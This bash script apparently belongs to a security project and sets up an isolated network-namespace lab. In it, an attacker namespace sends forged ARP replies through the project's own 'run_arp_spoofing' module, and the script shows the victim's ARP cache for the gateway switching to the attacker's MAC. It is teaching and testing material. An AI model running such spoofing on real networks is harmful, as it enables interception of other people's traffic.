#!/usr/bin/env bash
# Isolated ARP spoofing lab (Linux only, needs root).
#
# Topology, all inside network namespaces, one Linux bridge as the switch:
#
#   victim --(veth)-- [switch: br0] --(veth)-- gateway   (real gateway, 10.95.0.1)
#                           |
#                           +--(veth)-- attacker
#
#   Phase 1 (baseline): the victim pings the gateway, so its ARP cache holds
#   the gateway's real MAC for 10.95.0.1.
#   Phase 2 (spoofing): the attacker sends forged ARP replies that bind
#   10.95.0.1 to its own MAC. The victim's ARP cache entry changes to the
#   attacker's MAC, so the victim now sends gateway traffic to the attacker.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/arp_spoofing_lab.sh
#   sudo REPLY_SECONDS=3 scripts/lab/arp_spoofing_lab.sh
#
# Requirements: iproute2 (ip, bridge), and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
REPLY_SECONDS="${REPLY_SECONDS:-2}"
GATEWAY_IP="10.95.0.1"
VICTIM_IP="10.95.0.10"
ATTACKER_IP="10.95.0.30"
GATEWAY_MAC="02:00:00:00:00:01"
VICTIM_MAC="02:00:00:00:00:10"
ATTACKER_MAC="02:00:00:00:00:30"

stop_lab() {
    for ns in victim gateway attacker switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}

cleanup() {
    stop_lab
}
trap cleanup EXIT

# Remove leftovers from a previous interrupted run.
stop_lab

ip netns add switch
ip netns add victim
ip netns add gateway
ip netns add attacker

# victim <-> switch port sw-v
ip link add v-sw type veth peer name sw-v
ip link set v-sw netns victim
ip link set sw-v netns switch

# gateway <-> switch port sw-g
ip link add g-sw type veth peer name sw-g
ip link set g-sw netns gateway
ip link set sw-g netns switch

# attacker <-> switch port sw-a
ip link add a-sw type veth peer name sw-a
ip link set a-sw netns attacker
ip link set sw-a netns switch

ip netns exec switch ip link add br0 type bridge
ip netns exec switch ip link set br0 up
for port in sw-v sw-g sw-a; do
    ip netns exec switch ip link set "$port" master br0
    ip netns exec switch ip link set "$port" up
done

ip netns exec victim ip link set v-sw address "$VICTIM_MAC"
ip netns exec victim ip addr add "$VICTIM_IP/24" dev v-sw
ip netns exec victim ip link set v-sw up
ip netns exec gateway ip link set g-sw address "$GATEWAY_MAC"
ip netns exec gateway ip addr add "$GATEWAY_IP/24" dev g-sw
ip netns exec gateway ip link set g-sw up
ip netns exec attacker ip link set a-sw address "$ATTACKER_MAC"
ip netns exec attacker ip addr add "$ATTACKER_IP/24" dev a-sw
ip netns exec attacker ip link set a-sw up

# MAC the victim has cached for the gateway ("none" if no entry).
cached_gateway_mac() {
    local mac
    mac=$(ip netns exec victim ip neigh show "$GATEWAY_IP" dev v-sw \
        | grep -oE 'lladdr [0-9a-f:]{17}' | cut -d' ' -f2 || true)
    echo "${mac:-none}"
}

# --- Phase 1: baseline -----------------------------------------------------

echo "Phase 1: the victim contacts the gateway, so it learns the real MAC"
ip netns exec victim ping -c 2 -W 1 "$GATEWAY_IP" >/dev/null
echo "  victim's ARP cache for $GATEWAY_IP: $(cached_gateway_mac)"
echo

# --- Phase 2: forged ARP replies ------------------------------------------

SPOOF_CODE='
import os, threading, time
from macabre.attacks.arp_spoofing import ArpSpoofingConfig, run_arp_spoofing

stop = threading.Event()
progress = []
worker = threading.Thread(
    target=run_arp_spoofing,
    args=(
        ArpSpoofingConfig(
            iface="a-sw",
            spoofed_ip=os.environ["GATEWAY_IP"],
            victim_ip=os.environ["VICTIM_IP"],
            victim_mac=os.environ["VICTIM_MAC"],
            interval=0.2,
        ),
        stop,
        progress.append,
    ),
)
worker.start()
time.sleep(float(os.environ["REPLY_SECONDS"]))
stop.set()
worker.join()
print(f"Attacker: sent {progress[-1].frames} forged ARP replies from {progress[-1].sender_mac}")
'

echo "Phase 2: attacker sends forged ARP replies for $GATEWAY_IP"
ip netns exec attacker env PYTHONPATH="$ROOT/src" GATEWAY_IP="$GATEWAY_IP" VICTIM_IP="$VICTIM_IP" \
    VICTIM_MAC="$VICTIM_MAC" REPLY_SECONDS="$REPLY_SECONDS" "$PY" -c "$SPOOF_CODE"
echo "  victim's ARP cache for $GATEWAY_IP: $(cached_gateway_mac)"
echo
echo "Expected: before the attack the entry is the gateway's MAC ($GATEWAY_MAC);"
echo "after it, the entry is the attacker's MAC ($ATTACKER_MAC)."
